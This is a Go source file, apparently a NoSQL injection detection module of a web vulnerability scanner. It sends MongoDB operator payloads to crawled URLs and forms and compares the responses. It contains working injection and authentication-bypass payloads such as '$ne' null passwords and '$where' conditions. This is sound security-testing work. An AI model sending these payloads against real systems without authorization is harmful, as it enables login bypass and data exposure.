package modules

import (
	"bytes"
	"fmt"
	"github.com/SentinelXofficial/sxel/internal/output"
	"github.com/SentinelXofficial/sxel/pkg/core"
	"net/http"
	"net/url"
	"strings"
	"time"
)

type nosqlURLOperator struct {
	TrueParam  string
	TrueValue  string
	FalseParam string
	FalseValue string
	Label      string
}

var nosqlURLOps = []nosqlURLOperator{
	{"[$ne]", "xyz_nonexistent_0123456789", "[$eq]", "xyz_nonexistent_0123456789", "$ne vs $eq operator"},
	{"[$gt]", "", "[$lt]", "zzzzz", "$gt vs $lt operator"},
	{"[$regex]", ".*", "[$regex]", "^IMPOSSIBLEPATTERN12345$", "$regex .* vs no-match"},
	{"[$exists]", "true", "[$exists]", "false", "$exists true vs false"},
	{"[$in][]", "a", "[$nin][]", "a", "$in vs $nin array"},
}

type nosqlJSONPayload struct {
	Label     string
	TrueBody  string
	FalseBody string
}

var nosqlJSONPayloads = []nosqlJSONPayload{
	{
		Label:     "Auth bypass: password $ne null",
		TrueBody:  `{"username":"admin","password":{"$ne":null}}`,
		FalseBody: `{"username":"admin","password":"INVALID_PASSWORD_XYZ123"}`,
	},
	{
		Label:     "Auth bypass: password $gt empty",
		TrueBody:  `{"username":"admin","password":{"$gt":""}}`,
		FalseBody: `{"username":"admin","password":{"$lt":"AAAAA"}}`,
	},
	{
		Label:     "Auth bypass: username $ne null",
		TrueBody:  `{"username":{"$ne":null},"password":{"$ne":null}}`,
		FalseBody: `{"username":"INVALID_USER_XYZ","password":"INVALID_PASS_XYZ"}`,
	},
	{
		Label:     "Auth bypass: username $regex .*",
		TrueBody:  `{"username":{"$regex":".*"},"password":{"$ne":null}}`,
		FalseBody: `{"username":"INVALID_USER_XYZ","password":"INVALID_PASS_XYZ"}`,
	},
	{
		Label:     "Auth bypass: $where true",
		TrueBody:  `{"$where":"1==1"}`,
		FalseBody: `{"$where":"1==2"}`,
	},
}

var nosqlErrorMarkers = []string{
	"cannot use $",
	"unknown operator",
	"bad argument",
	"invalid operator",
	"dollar sign",
	"mongoerror",
	"mongoresult",
	"bsontype",
	"objectid",
	"bulkwriteerror",
	"writeconflict",
	"e11000 duplicate key",
	"assert failed",
	"mongosh",
}

func doJSONPOST(client *http.Client, cfg *core.Config, rawURL, jsonBody string) (string, int, error) {
	req, err := http.NewRequest("POST", rawURL, bytes.NewBufferString(jsonBody))
	if err != nil {
		return "", 0, err
	}
	core.ApplyHeaders(req, cfg)
	req.Header.Set("Content-Type", "application/json")
	resp, err := client.Do(req)
	if err != nil {
		return "", 0, err
	}
	defer resp.Body.Close()
	b := core.ReadBody(resp.Body)
	return b, resp.StatusCode, nil
}

func ScanNoSQLi(client *http.Client, cfg *core.Config, target core.CrawlResult) []core.ScanResult {
	var results []core.ScanResult

	var params url.Values
	p, err := url.Parse(target.URL)
	if err == nil {
		params, _ = url.ParseQuery(p.RawQuery)
	} else {
		params = url.Values{}
	}

	for param := range params {
		if cfg.Verbose {
			output.Verbose("[nosql-get] param=%s", param)
		}
		baseline := FetchBaseline(client, cfg, target.URL, param)
		if baseline.Status == 0 {
			continue
		}

	NoSQLURLLoop:
		for _, op := range nosqlURLOps {
			trueURL, err := buildNoSQLURL(target.URL, param, op.TrueParam, op.TrueValue)
			if err != nil {
				continue
			}
			falseURL, err := buildNoSQLURL(target.URL, param, op.FalseParam, op.FalseValue)
			if err != nil {
				continue
			}

			trueBody, trueStatus, err := core.DoGET(client, cfg, trueURL)
			if err != nil {
				continue
			}
			falseBody, falseStatus, err := core.DoGET(client, cfg, falseURL)
			if err != nil {
				continue
			}

			trueBodyLow := strings.ToLower(trueBody)
			for _, marker := range nosqlErrorMarkers {
				if strings.Contains(trueBodyLow, marker) && !strings.Contains(baseline.BodyLow, marker) {
					results = append(results, core.ScanResult{
						Type: "NoSQL Injection (Error-Based)",
						URL:  trueURL, Method: "GET", Parameter: param,
						Payload: op.Label, Severity: "HIGH",
						Evidence:  fmt.Sprintf("MongoDB error marker %q in response (HTTP %d)", marker, trueStatus),
						Timestamp: time.Now(),
					})
					break NoSQLURLLoop
				}
			}

			if trueStatus != baseline.Status || falseStatus != baseline.Status {
				// A status change on either side (WAF block, error page,
				// redirect) is not boolean evidence on its own — trusting it
				// produced false positives, so skip this operator.
				continue
			}
			distTrue := absInt(len(trueBody) - baseline.Length)
			distFalse := absInt(len(falseBody) - baseline.Length)
			if distTrue <= 150 && distFalse <= 150 {
				continue
			}
			diff := distTrue - distFalse
			if diff < 0 {
				diff = -diff
			}
			if diff < 150 {
				continue
			}
			if nosqlErrorEvidence(trueBody, baseline) != "" || nosqlErrorEvidence(falseBody, baseline) != "" {
				continue
			}
			payload := fmt.Sprintf("TRUE: %s%s=%s | FALSE: %s%s=%s",
				param, op.TrueParam, op.TrueValue, param, op.FalseParam, op.FalseValue)
			results = append(results, core.ScanResult{
				Type: "NoSQL Injection (Boolean-Based)",
				URL:  trueURL, Method: "GET", Parameter: param,
				Payload: payload, Severity: "HIGH",
				Evidence:  fmt.Sprintf("true-condition %d bytes / HTTP %d vs baseline %d bytes / HTTP %d — false-condition %d bytes / HTTP %d [%s]", len(trueBody), trueStatus, baseline.Length, baseline.Status, len(falseBody), falseStatus, op.Label),
				Timestamp: time.Now(),
			})
			break NoSQLURLLoop
		}
	}

	for _, form := range target.Forms {
		if strings.ToUpper(form.Method) == "GET" {
			for _, inp := range form.Inputs {
				if cfg.Verbose {
					output.Verbose("[nosql-form-get] %s input=%s", form.Action, inp.Name)
				}

				baseline := FetchBaseline(client, cfg, form.Action, inp.Name)
				if baseline.Status == 0 {
					continue
				}

			NoSQLGetFormLoop:
				for _, op := range nosqlURLOps {
					trueURL, err := buildNoSQLURL(form.Action, inp.Name, op.TrueParam, op.TrueValue)
					if err != nil {
						continue
					}
					falseURL, err := buildNoSQLURL(form.Action, inp.Name, op.FalseParam, op.FalseValue)
					if err != nil {
						continue
					}

					trueBody, trueStatus, err := core.DoGET(client, cfg, trueURL)
					if err != nil {
						continue
					}
					falseBody, falseStatus, err := core.DoGET(client, cfg, falseURL)
					if err != nil {
						continue
					}

					trueBodyLow := strings.ToLower(trueBody)
					for _, marker := range nosqlErrorMarkers {
						if strings.Contains(trueBodyLow, marker) && !strings.Contains(baseline.BodyLow, marker) {
							results = append(results, core.ScanResult{
								Type: "NoSQL Injection via core.Form (Error-Based)",
								URL:  form.Action, Method: "GET", Parameter: inp.Name,
								Payload: op.Label, Severity: "HIGH",
								Evidence:  fmt.Sprintf("MongoDB error %q in response (HTTP %d)", marker, trueStatus),
								Timestamp: time.Now(),
							})
							break NoSQLGetFormLoop
						}
					}

					if trueStatus != baseline.Status || falseStatus != baseline.Status {
						continue
					}
					distTrue := absInt(len(trueBody) - baseline.Length)
					distFalse := absInt(len(falseBody) - baseline.Length)
					if distTrue <= 150 && distFalse <= 150 {
						continue
					}
					if nosqlErrorEvidence(trueBody, baseline) != "" || nosqlErrorEvidence(falseBody, baseline) != "" {
						continue
					}
					diff := distTrue - distFalse
					if diff < 0 {
						diff = -diff
					}
					if diff < 150 {
						continue
					}
					results = append(results, core.ScanResult{
						Type: "NoSQL Injection via core.Form (Boolean-Based)",
						URL:  form.Action, Method: "GET", Parameter: inp.Name,
						Payload: op.Label, Severity: "HIGH",
						Evidence:  fmt.Sprintf("true-condition %d bytes / HTTP %d vs baseline %d bytes / HTTP %d — false-condition %d bytes / HTTP %d", len(trueBody), trueStatus, baseline.Length, baseline.Status, len(falseBody), falseStatus),
						Timestamp: time.Now(),
					})
					break NoSQLGetFormLoop
				}
			}
		}
	}

	postEndpoints := map[string]bool{target.URL: true}
	for _, form := range target.Forms {
		if strings.ToUpper(form.Method) == "POST" && form.Action != "" {
			postEndpoints[form.Action] = true
		}
	}

	for endpoint := range postEndpoints {
		if cfg.Verbose {
			output.Verbose("[nosql-json-post] %s", endpoint)
		}

		baselineBodyLow := ""
		if bBody, _, berr := doJSONPOST(client, cfg, endpoint, `{"sxel":"baseline"}`); berr == nil {
			baselineBodyLow = strings.ToLower(bBody)
		}

	NoSQLJSONLoop:
		for _, pl := range nosqlJSONPayloads {
			trueBody, trueStatus, err := doJSONPOST(client, cfg, endpoint, pl.TrueBody)
			if err != nil {
				continue
			}
			if trueStatus == 404 || trueStatus == 405 || trueStatus == 415 {
				continue
			}

			falseBody, falseStatus, err := doJSONPOST(client, cfg, endpoint, pl.FalseBody)
			if err != nil {
				continue
			}

			trueBodyLow := strings.ToLower(trueBody)
			for _, marker := range nosqlErrorMarkers {
				if strings.Contains(trueBodyLow, marker) && !strings.Contains(baselineBodyLow, marker) {
					results = append(results, core.ScanResult{
						Type: "NoSQL Injection (JSON POST — Error-Based)",
						URL:  endpoint, Method: "POST", Parameter: "body",
						Payload: pl.TrueBody, Severity: "HIGH",
						Evidence:  fmt.Sprintf("MongoDB error %q in response (HTTP %d)", marker, trueStatus),
						Timestamp: time.Now(),
					})
					break NoSQLJSONLoop
				}
			}

			if (trueStatus == 200 || trueStatus == 302) &&
				(falseStatus == 401 || falseStatus == 403 || falseStatus == 422) &&
				baselineBodyLow != "" {
				results = append(results, core.ScanResult{
					Type: "NoSQL Injection (JSON Auth Bypass)",
					URL:  endpoint, Method: "POST", Parameter: "body",
					Payload: pl.TrueBody, Severity: "CRITICAL",
					Evidence:  fmt.Sprintf("auth bypass: true=%d, false=%d [%s]", trueStatus, falseStatus, pl.Label),
					Timestamp: time.Now(),
				})
				break NoSQLJSONLoop
			}

			lenDiff := len(trueBody) - len(falseBody)
			if lenDiff < 0 {
				lenDiff = -lenDiff
			}
			trueGap := len(trueBody) - len(baselineBodyLow)
			falseGap := len(falseBody) - len(baselineBodyLow)
			if trueGap < 0 {
				trueGap = -trueGap
			}
			if falseGap < 0 {
				falseGap = -falseGap
			}
			if baselineBodyLow != "" &&
				!strings.Contains(baselineBodyLow, "sxel") &&
				lenDiff > 200 && trueStatus == falseStatus &&
				len(trueBody) > len(baselineBodyLow)*2 && len(falseBody) > len(baselineBodyLow)*2 &&
				trueGap > 200 && falseGap > 200 {
				results = append(results, core.ScanResult{
					Type: "NoSQL Injection (JSON POST — Boolean-Based)",
					URL:  endpoint, Method: "POST", Parameter: "body",
					Payload: pl.TrueBody, Severity: "HIGH",
					Evidence:  fmt.Sprintf("response diff: %d bytes (both HTTP %d) [%s]", lenDiff, trueStatus, pl.Label),
					Timestamp: time.Now(),
				})
				break NoSQLJSONLoop
			}
		}
	}

	return results
}

func buildNoSQLURL(rawURL, param, opSuffix, value string) (string, error) {
	p, err := url.Parse(rawURL)
	if err != nil {
		return "", err
	}
	q, err := url.ParseQuery(p.RawQuery)
	if err != nil {
		return "", err
	}
	delete(q, param)
	q.Set(param+opSuffix, value)
	p.RawQuery = q.Encode()
	return p.String(), nil
}

func nosqlErrorEvidence(body string, bl core.BaselineResult) string {
	low := strings.ToLower(body)
	for _, m := range nosqlErrorMarkers {
		if strings.Contains(low, m) && !strings.Contains(bl.BodyLow, m) {
			return m
		}
	}
	return ""
}
